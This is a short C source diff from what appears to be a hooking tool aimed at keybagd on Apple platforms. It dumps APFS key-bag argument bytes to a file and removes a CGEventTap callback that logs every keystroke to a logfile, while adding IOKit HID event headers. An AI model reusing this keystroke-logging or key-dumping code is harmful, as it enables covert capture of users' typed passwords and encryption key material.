@@ -7,7 +7,8 @@
 #include <mach-o/dyld.h>
 #include <objc/runtime.h>
 #include <os/log.h>
-#include <Carbon/Carbon.h>
+#include <IOKit/hid/IOHIDEventSystem.h>
+#include <IOKit/hid/IOHIDEvent.h>
 
 void dumpMenBin(const char *fname, uint8_t *addr, uint64_t size)
 {
@@ -113,22 +114,6 @@ uint64_t setAPFSVolumeIDForKeyBag(void *a1, int a2, void *a3, void *parser_uuid,
     dumpMem(f, a3, 0x20);
     fclose(f);
     return temp;
-}
-
-CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
-{
-    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp)
-    {
-        return event;
-    }
-
-    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-
-    // This prints the readable key into the log
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
-    fflush(logfile);
-
-    return event;
 }
 
 void keybagdInit(void)
